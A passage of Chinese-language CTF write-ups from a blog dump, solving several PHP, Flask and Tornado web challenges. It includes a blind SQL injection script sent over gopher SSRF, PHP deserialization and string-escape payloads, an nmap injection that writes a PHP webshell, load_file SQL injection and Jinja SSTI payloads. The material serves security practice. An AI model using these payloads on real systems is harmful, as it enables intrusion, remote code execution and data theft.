table_schema=database()),\"+str(pos)+\",1) )=\"+str(i)+\",sleep(2),1) # \" #联合查询，猜测文件名 poc = \"') union select 1,2,if(ascii( substr((select * from flag),\" + str(pos) + \",1) )=\" + str( i) + \",sleep(2),1) # \" #读取文件flag中的值 bs = str(base64.b64encode(poc.encode(\"utf-8\")), \"utf-8\") #flag的值经过utf-8于base64编码 final_poc = \"gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D\" + bs + \"%3B%250d%250a\" #需要解码，内容请参考截图 t1 = time.time() res = requests.get(url + final_poc) t2 = time.time() if (t2 - t1 &gt; 2):#以上四行为延时注入的时间判断语句，爆破期间如果某字符返回响应的时间较长 flag += chr(i) #写入字符串flag print(flag) #输出flag break #进入下一字符的爆破 print(flag) 其中 变量final_poc经过两次url解码，内容如下所示，将变量bs(编码后的变量poc)传到服务器~ 参考文章： 剩下的细节就参考：gopher协议基础 gopher实战1：gopher协议的利用 - FreeBuf网络安全行业门户 gopher实战2：Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com) SSRF实战1：SSRF漏洞 - Saint_Michael - 博客园 (cnblogs.com) SSRF实战2：SSRF深入各种高级实战用法_G0mini的博客-CSDN博客 SSRF实战3：ssrf漏洞利用(内网探测、打redis) - ctrl_TT豆 - 博客园 (cnblogs.com) wp参考1 wp参考2","categories":["攻防世界"]},{"title":"内部竞赛3","path":"/2023/08/19/nei-bu-jing-sai-ti-3/","content":"web1 &lt;?php highlight_file(__FILE__); error_reporting(0); class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(\"/\\&lt;\\?php|\\(|\\)|\\\"|\\'/\", $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(\"Try Hard !!\"); } } } } //只有36d的人才能看到flag if(intval(strrev($_GET['c']))==0x36d){ if (isset($_GET['great'])){ unserialize($_GET['great']); } else { die('error'); } }else { echo 'hacker!!!'; } ?&gt; hacker!!! 反序列化前有个简单的特性，我们输入778反转后是877也就是0x36d的十进制，由于弱比较的类型转化，就能绕过。 接着看魔术方法，这里要求其变量不能相等，但经过md5加密与sha1加密之后要分别相等，相信大多数人觉得数组绕过就行了，但当你走到eval发现没办法了，这时候就涨知识了，用到了php的原生类：Exception类 在此类中： - `Exception::__construct` — 异常构造函数 - `Exception::getMessage` — 获取异常消息内容 - `Exception::getPrevious` — 返回异常链中的前一个异常 - `Exception::getCode` — 获取异常代码 - `Exception::getFile` — 创建异常时的程序文件名称 - `Exception::getLine` — 获取创建的异常所在文件中的行号 - `Exception::getTrace` — 获取异常追踪信息 - `Exception::getTraceAsString` — 获取字符串类型的异常追踪信息 - `Exception::__toString` — 将异常对象转换为字符串 - `Exception::__clone` — 异常克隆 可以看到自带tostring方法，这个方法用于将异常或错误对象转换为字符串。 &lt;?php $a = new Exception(\"payload\",1);$b = new Exception(\"payload\",2); echo $a; echo \"&lt;br&gt;\"; echo $b; ?&gt; //输出 exception 'Exception' with message 'payload' in D:\\labwork\\phpstudy_pro\\WWW\\test\\test.php:2 Stack trace: #0 {main} exception 'Exception' with message 'payload' in D:\\labwork\\phpstudy_pro\\WWW\\test\\test.php:2 Stack trace: #0 {main} 当然Eorror类与其一样，不过前者只用于php7，后者5和7均可，我们可以知道这道题版本为7，因此只能用该类 此时在注意preg_match函数多了一个math参数，这里将会把匹配到的内容分为数组穿进去，不过这里利用的点不是他 ​ 由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 include “/flag” 将flag包含进来即可；由于过滤了引号，我们直接用url取反绕过 URL编码取反绕过 适用PHP版本：无限制 当PHP&gt;=7时，可以直接利用取反构造payload PS C:\\Users\\Administrator&gt; php -r \"var_dump(urlencode(~'phpinfo'));\" Command line code:1: string(21) \"%8F%97%8F%96%91%99%90\" //实际上 (~%8F%97%8F%96%91%99%90)(); #phpinfo(); 则poc如下 //利用链如下 &lt;?php class SYCLOVER { public $syc; public $lover; public function __wakeup(){ } } $str = \"?&gt;&lt;?=include~\".urldecode(\"%D0%99%93%9E%98\").\"?&gt;\"; //~urldecode=/flag $a=new Exception($str,1);$b=new Exception($str,2); $c = new SYCLOVER(); $c-&gt;syc = $a; $c-&gt;lover = $b; echo(urlencode(serialize($c))); ?&gt; //这里解释以下，为什么要闭合掉\"?&gt;\"，因为前面可能会有一些报错的信息，所以可以先闭合掉前面的东西，然后再来包含后面的是取反，因为在链里面所以需要用到解码，不用编码绕不过去正则，里面是/flag因为刷题多了都在根目录下面，不在的话正能一步步尝试。 拿到flag web2 点进去看到源码，我一看审计有难度。。。 &lt;?php require('flag.php'); $function = @$_GET['f']; //get传参 function filter($img){ //对变量进行检验,过滤特定关键词 $filter_arr = array('jpg','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } if($_SESSION){ //若session不存在,则销毁session unset($_SESSION); } $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = $function; extract($_POST); //变量覆盖,漏洞利用点 if(!$function){ echo '&lt;a href=\"index.php?f=highlight_file\"&gt;source_code&lt;/a&gt;'; } if(!$_GET['img_path']){//这里又sha1加密,大概率不用了考虑了,这里利用不了 $_SESSION['img'] = base64_encode('guest_img.png'); }else{ $_SESSION['img'] = sha1(base64_encode($_GET['img_path'])); } $serialize_info = filter(serialize($_SESSION));//对序列化的session变量过滤在赋值 if($function == 'highlight_file'){ highlight_file('index.php'); }else if($function == 'phpinfo'){ //这里没啥用 eval('phpinfo();'); //maybe you can find something in here! }else if($function == 'show_image'){//反序列化切入点 $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode(base64_decode($userinfo['img']))); } 首先就是给f传参show_image以便进行反序列化,接着我们一步步测试一下 方法一：反序列化字符串逃逸 &lt;?php highlight_file(__FILE__); function filter($img){ //对变量进行检验,过滤特定关键词 $filter_arr = array('jpg','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = 'a'; $_SESSION['img'] = 'Wm14aFp5NXdhSEE9';//flag.php base64编码两次 //extract($_POST); //变量覆盖,漏洞利用点 echo '&lt;br&gt;'; var_dump(serialize($_SESSION)); ?&gt; 结合filter函数的过滤，这里可以想到反序列化字符串逃逸，又因为代码中说，如果get参数img_path不存在，则会直接给img变量赋值，那我们想绕过只能靠逃逸。可以先构造如下： &lt;?php highlight_file(__FILE__); function filter($img){ //对变量进行检验,过滤特定关键词 $filter_arr = array('jpg','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = 'a\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}'; $_SESSION['img'] = 'Wm14aFp5NXdhSEE9';//flag.php base64编码两次 //extract($_POST); //变量覆盖,漏洞利用点 echo '&lt;br&gt;'; var_dump(serialize($_SESSION)); ?&gt; string(124) \"a:3:{s:4:\"user\";s:5:\"guest\";s:8:\"function\";s:38:\"a\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\" //在这里我们就要利用function变量来构建img变量，于是我们要在user中添加flag或者其他关键词，以便其后被过滤为空的时候，可以吞进一部分function的内容。 //再想一下，要吞到哪里，那很明显是\"#\";s:8:\"function\";s:38:\"a#\"，即#之间的内容，这样后面的img才会被当做新的session变量，那么我们看一下这一段字符串的数量：24，那我们可以给user赋值为6个flag即可， poc： $_SESSION[\"user\"] = 'flagflagflagflagflagflag'; $_SESSION['function'] = 'a\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}'; $_SESSION['img'] = 'Wm14aFp5NXdhSEE9';//flag.php base64编码两次 string(144) \"a:3:{s:4:\"user\";s:24:\"flagflagflagflagflagflag\";s:8:\"function\";s:38:\"a\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\" //过滤后 string(120) \"a:3:{s:4:\"user\";s:24:\"\";s:8:\"function\";s:38:\"a\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\" //可以发现s:24:\"后面要吞进去24个字符，直到\"a这里，然后后面的双引号闭合字符串，分号闭合该变量，于是 s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\"; //就会单独当做img变量，poc如下： _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";s:2:\"dd\";s:1:\"a\";} //这里由于前面是3个属性,所以要加一个. 继续编码访问即可 _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a\";s:3:\"img\";s:16:\"Wm14aFlXRmhZV0Zu\";s:2:\"dd\";s:1:\"a\";} 拿到flag，这里说明一下为何传参为_SESSION而不是$_SSEION，这是因为代码中的extract函数，会将传入的post内容进行变量覆盖，而_SESSION这里要当做变量名，故此在后续中会被当做键值然后在作为变量名，也就是自动添加$。 方法二：变量覆盖 这个其实跟方法一差不多，只不过我认为有点烧脑，但也更加简便 我们已经知道我们要传的是： _SESSION[img]=;s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";} 但由于有一个自动给img变量赋值的语句： $_SESSION['img'] = base64_encode('guest_img.png'); 因此我们需要利用filter函数，假如我们传入： _SESSION[imgphp]=;s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";} 那么php被过滤，但此变量依旧存在也就是：_SESSION[img]=;s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";} 不会和环境自带的img变量冲突，输入如下 \"a:1:{s:7:\"img\";s:36:\";s:3:\"img\";s:20:\"Wm14aFp5NXdhSEE9\";}\";}\" //由此我们又想到字符串逃逸，我们想法读到s:36:即可，一共10个，那么构造如下 \"a:1:{s:10:\"img\";s:36:\";s:3:\"img\";s:20:\"Wm14aFp5NXdhSEE9\";}\";}\"//分号闭合结尾，而环境自带的img变量便读不进去而没用了 //poc； $_SESSION[imgflag]=;s:3:\"123\";s:3:\"img\";s:16:\"$_SESSION[imgphpflag]=;s:3:\"123\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\";} //但要注意有三个元素,因此这里还要在添加一个,但要添加在前面 //输出 \"a:1:{s:7:\"img\";s:50:\";s:3:\"123\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\";}\" //为了读取到:我们要再添加三个字符,让s:7变成s:10, //最终payload $_SESSION[imgjpgflag]=;s:3:\"123\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";} 文章参考： 参考一 参考二 web3 没信息，点击开始看看 看源代码 base64解码看看 那就访问一下110.php，有点复杂的代码审计，不慌 &lt;?php include 'fl0g.php'; highlight_file(__FILE__); if(isset($_GET['mo'])&amp;&amp;isset($_GET['fish'])) { $mo=$_GET['mo']; $fish=$_GET['fish']; $logined=false; $keys=true; if (!ctype_alpha($mo)){$keys=false;} if (!is_numeric($fish) ){$keys=false;} if (md5($mo) == md5($fish)) { echo\"Let's start fishing !\"; $b = $_GET['b']; { if('f1a9' === substr(md5($b),-4,4)) { $password=\"doyoulikemoyu?\"; if(isset($_POST['password'])) { if(strcmp($_POST['password'],$password) == 0) { if (isset($_POST['message'])) { $message = json_decode($_POST['message']); $key =\"*********\"; if($message-&gt;key == $key) { $logined=true; } } } else { echo\"That's a little bit !\"; } } else { echo\"you don't like mo yu ???\"; } } else { die(\"You are not far from success !\"); } } } else { echo\"good see you next !\"; } } else { echo\"Think again !\"; } if($logined&amp;&amp;$keys) { echo 'Congratulations on your successful fishing !'; highlight_file('fl0g.php'); die('By Wang'); } ?&gt; Think again ! 绕过一： 这里要求输入的内容为字符串 这里则是检测是否为数字，接着配合md5弱比较，但这里不能用数组，因为前面的if会影响变量的布尔值。因此只需要其md5值是以0e开头即可 只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，因为不管0不论和多少相乘都是0。 一些例子： 1.QNKCDZO 0e830400451993494058024219903391 2.s878926199a 0e545993274517709034328855841020 3.s155964671a 0e342768416822451524974117254469 4.s214587387a 0e848240448830537924465865611904 5.s214587387a 0e848240448830537924465865611904 6.s878926199a 0e545993274517709034328855841020 7.s1091221200a 0e940624217856561557816327384675 8.s1885207154a 0e509367213418206700842008763514 9.240610708 0e462097431906509019562988736854 于是这里传参为：?mo=QNKCDZO&amp;fish=240610708 绕过二: 第一处要求传入的参数经过md5加密后的后四位与指定的字符串相同，无法，只得上脚本。 import hashlib for i in range(100000): m = hashlib.md5() m.update(str(i).encode()) h = m.hexdigest() if h[-4:] == \"f1a9\": print(i) break 成功！ 绕过三： $password=\"doyoulikemoyu?\"; if(isset($_POST['password'])) { if(strcmp($_POST['password'],$password) == 0) 这里我不理解这个password的设定，感觉有问题，不过考察点可以知道就是绕过strcmp，考虑其特性 strcmp是比较两个字符串，如果两者相等 返回0 题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型， 那我们传入 password[]=xxx 可以绕过 这是因为函数接受到了不符合的类型，将发生错误，返回null，因此与0比较会判断相等 $message = json_decode($_POST['message']); $key =\"*********\"; if($message-&gt;key == $key) { $logined=true; } 绕过四： 这里的key变量就正常了，显然考察的有时json解码 输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==\"admin\"这种形式绕过 因为说到底这就是个弱比较类型，0与字符串比较都是返回true 故payload如下 get：?mo=QNKCDZO&amp;fish=240610708&amp;b=12400 post：password[]=1&amp;message={\"key\":0} 拿到flag web4 开始审计 &lt;?php $text = $_GET[\"text\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"flag is here\")){ echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file)){ echo \"Not now!\"; exit(); }else{ include($file); //here.php $password = unserialize($password); echo $password; } } else{ highlight_file(__FILE__); } ?&gt; 这里传入text参数，并且其中的内容要完全等于\"flag is here\"，这时候就想到input或者data伪协议 使用php://input伪协议绕过 将要GET的参数?xxx=php://input 用post方法传入想要file_get_contents()函数返回的值 原因：php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行，当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容，从而导致任意代码执行。 用data://伪协议绕过 将url改为：?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码 或者将url改为：?xxx=data:text/plain,(url编码的内容) 我们有看到here.php文件包含，在这之前我们需要先使用filter协议读取里面的源码。 payload如下：?text=data://text/plain;base64,ZmxhZyBpcyBoZXJl&amp;file=&amp;file=php://filter/convert.base64-encode/resource=here.php &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"OMO SO CLOSE !///COME ON\"); } } } ?&gt; //poc如下： &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ } $poc=new Flag(); $poc-&gt;file=\"flag.php\"; echo serialize($poc); ?&gt; //这里序列化后的字符串被赋值为password，然后再页面有echo $password的语句，故此调用tostring方法，成功读到flag payload如下：?text=data://text/plain;base64,ZmxhZyBpcyBoZXJl&amp;file=&amp;file=here.php&amp;password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";} web5 &lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {//判断是否存在xff头 $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR']; }//若存在，则将客户端 IP 地址设置为 HTTP_X_FORWARDED_FOR 的值 if(!isset($_GET['host'])) { highlight_file(__FILE__); } else { $host = $_GET['host']; $host = escapeshellarg($host);//把字符串转码为可以在 shell 命令里使用的参数 $host = escapeshellcmd($host);// shell 元字符转义 $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']); //代码生成一个名为 $sandbox 的目录名，该目录名是基于 \"glzjin\" 和客户端 IP 地址的 MD5 散列值。 echo 'you are in sandbox '.$sandbox; @mkdir($sandbox);//在当前工作目录下创建了这个目录，并将工作目录切换到该目录中。 chdir($sandbox); echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host); //执行了一个 nmap 命令来扫描用户提供的主机，扫描结果会被输出显示。 } 审了半天不清楚利用点。。。。借助wp吧，太菜了 escapeshellarg()函数：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号) escapeshellcmd()函数：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\\）会在以下字符之前插入： &amp;#;`|?~&lt;&gt;^()[]{}$, \\x0A 和 \\xFF。 *’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 上述太抽象，测试一番 &lt;?php $a=1; echo $a; echo '&lt;br&gt;'; $a=escapeshellarg($a); echo $a; echo '&lt;br&gt;'; $a=escapeshellcmd($a); echo $a; ?&gt; escapeshellarg()函数将整个字符串加了单引号包裹，并且对单引号进行了转义，转义的单引号也使用了单引号包裹起来，然后用escapeshellcmd()函数进行了转义，成对出现的单引号不转义，对\\进行了转义，对最后一个单引号（单个出现）进行了转义 在看 传入的参数是：172.17.0.2’ -v -d a=1 经过escapeshellarg处理后变成了’172.17.0.2’‘’ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成’172.17.0.2’\\‘’ -v -d a=1’，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义： 最后执行的命令是curl ‘172.17.0.2’\\‘’ -v -d a=1’，由于中间的\\被解释为\\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1’，即向172.17.0.2\\发起请求，POST 数据为a=1’。 对ip进行加密，然后创建目录，输出system执行nmap命令后的结果，比如传入127.0.0.1，返回： 框起来的字符就是创建的目录路径 通过查资料得知nmap 中的-oG参数可以将命令和结果写入文件 一般flag都在根目录下，直接使用反引号进行命令执行 构造payload： ?host=' &lt;?php echo `cat /flag`;?&gt; -oG test.php ' //如此写是为了防止那两个函数的转义,详解如下 访问该目录下的test.php即可 贴一下大佬的试错： 关于加不加最后的单引号或加不加 单引号前的空格做了结果展示 首先是后面没有加引号 ?host=‘ &lt;?php @eval($_POST[\"hack\"]);?&gt; -oG hack.php我们可以在线测试一下 ‘‘\\‘‘ &lt;?php phpinfo();?&gt; -oG test.php\\‘返回结果是上面那样文件名后面会多一个引号 然后是加引号但引号前没有空格 ?host=‘ &lt;?php @eval($_POST[\"hack\"]);?&gt; -oG hack.php‘ 1 运行结果如下 ‘‘\\‘‘ &lt;?php phpinfo();?&gt; -oG test.php‘\\‘‘‘文件名后面就会多出\\ 所以要注意细节 不过这个代码似乎没啥用 if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {//判断是否存在xff头 $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR']; 参考文章： wp参考 web6 简单的php反序列化 index.php &lt;?php # @dance.php error_reporting(0); class message{ public $cai; public $xv; public $kun; public $token='lanqiu'; public function __construct($c,$x,$k){ $this-&gt;cai = $c; $this-&gt;xv = $x; $this-&gt;kun = $k; } } $c = $_GET['c']; $x = $_GET['x']; $k = $_GET['k']; if(isset($c) &amp;&amp; isset($x) &amp;&amp; isset($k)){ $msg = new message($c,$x,$k);//该类在dance.php中 $umsg = str_replace('okok', 'nonoo', serialize($msg));//估计就是字符串逃逸了 setcookie('msg',base64_encode($umsg)); echo 'Your message has been sent'; } highlight_file(__FILE__); dance.php &lt;?php include 'flag.php'; highlight_file(__FILE__); class message{ public $cai; public $xv; public $kun; public $token='lanqiu'; public function __construct($c,$x,$k){ $this-&gt;cai = $c; $this-&gt;xv = $x; $this-&gt;kun = $k; } } if(isset($_COOKIE['msg'])){ $msg = unserialize(base64_decode($_COOKIE['msg'])); if($msg-&gt;token=='sings'){ //令token=sings即可得到flag highlight_file('flag.php'); } } //$umsg = str_replace('okok', 'nonoo', serialize($msg));//估计就是字符串逃逸了 这个文件就是关键了，开始测试 token我们不能直接传参，可以通过字符逃逸来完成。这里每一个okok字符串就会多一个字符。 用双引号将其闭合，所以我们可以在$kun赋值为\";s:5:“token”;s:5:“sings”;}，这些就是我们要逃逸的字符，有27个，那么我们就加上27个okok字符串。payload为 ?c=1&amp;x=1&amp;k=okokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokok\";s:5:\"token\";s:5:\"sings\";} web7 又是原p！！！，查看源代码也没啥信息，尝试扫目录 访问看看 没权限 有点懵，给了个序列化字符串，不知道啥意思，那就抓包看有啥惊喜 有点可疑，与序列化字符串相对应，尝试更换一下 得到base64，接下来反转一下解码即可","categories":["内部竞赛"]},{"title":"攻防世界-fakebook","path":"/2023/08/18/fakebook/","content":"题目描述： 无 题目解题： 进入页面 这里先login看看 老规矩先试试弱口令，测试一番没啥用，那就换思路，随便注册一个看看 这里也是注册了三个，以便测试，点击每个页面看看 感觉没啥利用的点，于是回到最初我们先扫一下网站 看到了flag.php，我还以为是真的，结果没啥用，那看看robots.txt 那我们访问之后发现了一份源码如下 &lt;?php class UserInfo { public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) //接受用户join的相关信息 { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) //主要是返回用户所输入的博客内容 { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () //调用get函数 { return $this-&gt;get($this-&gt;blog); } public function isValidBlog ()//利用正则判断博客格式是否正确，这里呢只需要.分隔开就可以 { $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); } } 这里感觉有点模糊，没啥利用的点，返回页面看到url上有no参数，想到了sql，尝试一下 可以看到报错，说明的确存在，那我们就先手动测试一番 这里发现有四列 接着想查看数据库名 不出所料过滤了。。。。 那先手动fuzz，这里不出所料就是union select的过滤了，尝试一下双写，大小写，注释符看看 测试发现过滤的是“union select”这个字符串 这里发现第二列是回显位 接着看一下当前数据库名称与用户 这里常规说继续看表名列名来找flag，不过看了wp发现，这里又root身份，权限很高，那么可以利用mysql中的load_file函数。 允许访问系统文件，并将内容以字符串形式返回，不过需要的权限很高，且函数参数要求文件的绝对路径。//这巧了不是，条件全都有。 view.php?no=-3 union/**/select 1,load_file(\"/var/www/html/flag.php\"),3,4# 找到flag。 接下来接着按常规思路看看 ?no=-3 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=\"fakebook\"# //爆表名 ?no=-3 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=\"users\"# //爆列名 在这里data字段最可疑 ?no=-3 union/**/select 1,group_concat(username,data),3,4 from users# 如图发现序列化字符串 接下来就不太会了，跟着wp走 接下来的东西，我认为需要猜。最开始时的用户页面no=1时，页面返回用户的用户名、密码、博客之类的消息。毫无疑问，页面是根据users表中no=1的这条数据，渲染的页面。因为回显，我们只证明了查询语句的第二个字段是username。其余三个字段并不明确，但我们可以猜测，应该和数据库表中的字段顺序相似。第四个字段应该就是data，而我们现在有一个现成的data数据，能否模拟下？ ?no=-3 union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:123;s:4:\"blog\";s:8:\"123.blog\";}' 发现成功回显，并且这似乎是新建的，因为此前我并没有这一项数据，在看wp： ​ 注意no现在的值为2，我们知道这个用户是不存在的。换而言之，原SQL语句的查询结果为空，而我们通过union加入了我们构造的查询语句，让SQL语句有了查询结果，并且此查询结果符合页面渲染要求，所以页面正常显示了。 大佬就是强，这思路很顶！！！ ​ 并且由此得知，只要有data字段的对象序列，就可以成功渲染页面，其他字段并不是很重要。（页面中age和blog的值，显然也都是从序列化的对象里面得到的），接下来就是让我迷的点，你修改对象序列里面的blog参数内容： s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\"; ​ 用file伪协议读取flag内容交给blog参数，然后你再查看源码，iframe的src就发生了变化： 找到flag 接下来在看佬的思路： 回想刚刚的问题，如何想到的修改序列里面的blog参数呢？最开始blog参数值为123.blog，源码里iframe的src并没有什么变化。 个人认为，如果靶场想启发用户修改blog参数值，应当在blog值被修改后，源码里的src适当变化下，让用户知道，这个点可以使用。无论怎样换blog参数，src没有任何变化，就很难想到再跟进一步的利用伪协议去读取内容了。 当然，如果怪没有提示，也并不准确，因为有个点，我们还没用到。详细看最开始我们得到的备份文件： getBlogContent函数，我们猜也是个获取blog内容的函数。而其内部调用了我们一开始就说有问题的get函数，接受一个url，并将指定url的内容返回。换而言之，只要blog参数是可以请求到内容，返回不为404的，getBlogContents函数即有返回结果。毫无疑问，伪协议file就能达到要求。 那我们换个链接请求下呗： ?no=-3%20union/**/select%201,2,3,%27O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:123;s:4:\"blog\";s:26:\"http://111.198.29.45:34016\";}%27 就换成靶场最开始的主页。 查看源码： 这个图片没复现出来,不知为何,就先看个思路。 果不其然，将其base64转码，应该就能得到主页的源码了。 所以致此，我们可以总结下来。getBlogContents函数调用get函数，把unserinfo类中的blog参数当做一个URL，得到请求内容。而页面里iframe里的src根据得到的内容进行页面渲染。 正确的思路流程应当为，得到备份文件，明确getBlogContents函数通过一个URL获取内容，并且URL由类实例化对象的blog参数提供。然后在构造userinfo对象序列化发现页面可以正常返回之后，就尝试修改序列化中的blog参数，发现页面中iframe的src暴露信息，进而想到可以使用伪协议读取flag，并让src显示。 其实，在构造blog的时候，报错信息也一直在给予提示： 思路很顶，学到了 参考文章： 文章参考","categories":["攻防世界"]},{"title":"攻防世界-shrine","path":"/2023/08/18/shrine/","content":"题目描述： 无 题目解题： 直接访问发现python的一种模板框架代码，复制进idea看看，进行代码审计 import flask import os # 导包 app = flask.Flask(__name__) #创建 Flask 应用 app.config['FLAG'] = os.environ.pop('FLAG') # 获取环境变量flag @app.route('/') # 设置当前目录的路由，会读取当前文件的内容并返回。 def index(): return open(__file__).read() @app.route('/shrine/') # 匹配 '/shrine/' 路径 def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] # 这里对用户的输入过滤了config，self，以及两个括号 return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ == '__main__': app.run(debug=True) 那我们先访问一下shrine路由 没啥特殊的，那结合源代码中的render渲染函数我们直接在url后面加点东西看看 可以发现，存在ssti注入漏洞，由于这里flag在全局中，找一些合适payload即可 {{url_for.__globals__['current_app'].config.FLAG}} {{get_flashed_messages.__globals__['current_app'].config.FLAG}} 翻了翻仓库发现上述两个均可以获取到配置信息 拿到flag","categories":["攻防世界"]},{"title":"攻防世界-easytornado","path":"/2023/08/18/easytornado/","content":"题目描述： Tornado 框架 题目解题： 进入题目看到如上，一个个点击看看 既然是hint，那这里就是提示了这里的含义应该是，将filename经过md5加密，再加上cookie最后在加密 也就分析到这里了，后面没啥头绪，只是确定的是这估计是个ssti注入漏洞，看了wp发现 我们要访问/fllllllllllllag文件，url中也要以GET方式提交了2个参数：filename=/fllllllllllllag&amp;filehash= 62499926a4a274c1614cf899bf7816b0 直接访问是会报错的： http://111.200.241.244:53713/file?filename=/fllllllllllllag 但细细观察发现msg参数的内容与前端页面内容一致，那么可以猜测这时就是注入点，那我们尝试一下即可 但这里缺报错了，有点蒙，那估计就和框架有关了，在看wp发现，还是结合提示，这里我们首先已经得知要访问的文件名，那么此时就要想法获得cooki_secret。 查看tornado的官方文档 cookie_secret在tornado框架中的tornado.web.RequestHandler和tornado.web.Application类中有使用到： tornado.web.RequestHandler（HTTP请求处理程序的基类） RequestHandler.get_secure_cookie( name , value=None , max_age_days=31 , min_version=None ) 如果验证通过，则返回给定的签名cookie，否则返回 None。 RequestHandler.settings RequestHandler类的设置参数，它的别名self.application.settings。 tornado.web.Application（组成 Web 应用程序的请求处理程序的集合） tornado.web.Application.settings： 传递给构造函数的其他关键字参数保存在settings字典中，并且通常在文档中称为“应用程序设置”。设置用于自定义 Tornado 的各个方面（尽管在某些情况下，通过覆盖 的子类中的方法可以实现更丰富的自定义RequestHandler）。一些应用程序还喜欢使用settings字典作为一种方式，使处理程序可以使用特定于应用程序的设置，而无需使用全局变量。 